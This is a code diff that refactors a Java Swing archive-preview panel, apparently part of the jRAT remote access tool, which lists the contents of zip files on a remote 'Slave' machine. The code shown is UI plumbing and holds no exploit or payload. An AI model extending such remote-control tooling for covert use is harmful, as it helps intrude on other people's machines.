@@ -1,56 +1,35 @@
-package jrat.module.fs.ui;
+package jrat.module.fs.ui.previews;
 
+import iconlib.FileIconUtils;
 import iconlib.IconUtils;
+import jrat.api.Resources;
+import jrat.common.utils.DataUnits;
 import jrat.controller.Slave;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
-import jrat.controller.ui.frames.BaseFrame;
 import jrat.module.fs.packets.Packet63PreviewArchive;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
-import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.awt.event.WindowAdapter;
-import java.awt.event.WindowEvent;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.zip.ZipEntry;
 
 
 @SuppressWarnings("serial")
-public class FramePreviewZip extends BaseFrame {
+public class FramePreviewZip extends FilePreview<ZipEntry> {
 
-	public static Map<Slave, FramePreviewZip> INSTANCES = new HashMap<Slave, FramePreviewZip>();
-
-	private JPanel contentPane;
 	private JTable table;
 	private TableModel model;
 	private String file;
 
-	public TableModel getModel() {
-		return model;
-	}
-
 	public FramePreviewZip(Slave s, String f) {
-		super(s);
-		addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosing(WindowEvent arg0) {
-				exit();
-			}
-		});
+		super(s, "Archive Preview - " + f, Resources.getIcon("archive"));
+
 		this.file = f;
-		INSTANCES.put(slave, this);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePreviewZip.class.getResource("/icons/archive.png")));
-		setTitle("ZIP FilePreview - " + f);
-		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 445, 315);
-		contentPane = new JPanel();
-		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
-		setContentPane(contentPane);
+		setBorder(new EmptyBorder(5, 5, 5, 5));
 
 		JButton btnReload = new JButton("Reload");
 		btnReload.setIcon(IconUtils.getIcon("update"));
@@ -92,12 +71,28 @@ public class FramePreviewZip extends BaseFrame {
 		table.getColumnModel().getColumn(2).setPreferredWidth(104);
 		table.setRowHeight(30);
 		scrollPane.setViewportView(table);
-		GroupLayout gl_contentPane = new GroupLayout(contentPane);
+		GroupLayout gl_contentPane = new GroupLayout(this);
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addGap(8).addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear)));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 234, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addGap(5)));
-		contentPane.setLayout(gl_contentPane);
+		setLayout(gl_contentPane);
 		reload();
 	}
+
+    /**
+     * Add a zip entry to the table
+     */
+	public void addData(ZipEntry entry) {
+	    String name = entry.getName();
+        String size = "";
+
+        if (!entry.isDirectory()) {
+            size = DataUnits.getAsString(entry.getSize());
+        }
+
+        Icon icon = FileIconUtils.getIconFromExtension(name, entry.isDirectory());
+
+        model.addRow(new Object[] { icon, name, size });
+    }
 
 	public void clear() {
 		while (model.getRowCount() > 0) {
@@ -107,9 +102,5 @@ public class FramePreviewZip extends BaseFrame {
 
 	public void reload() {
 		slave.addToSendQueue(new Packet63PreviewArchive(file));
-	}
-
-	public void exit() {
-		INSTANCES.remove(slave);
 	}
 }
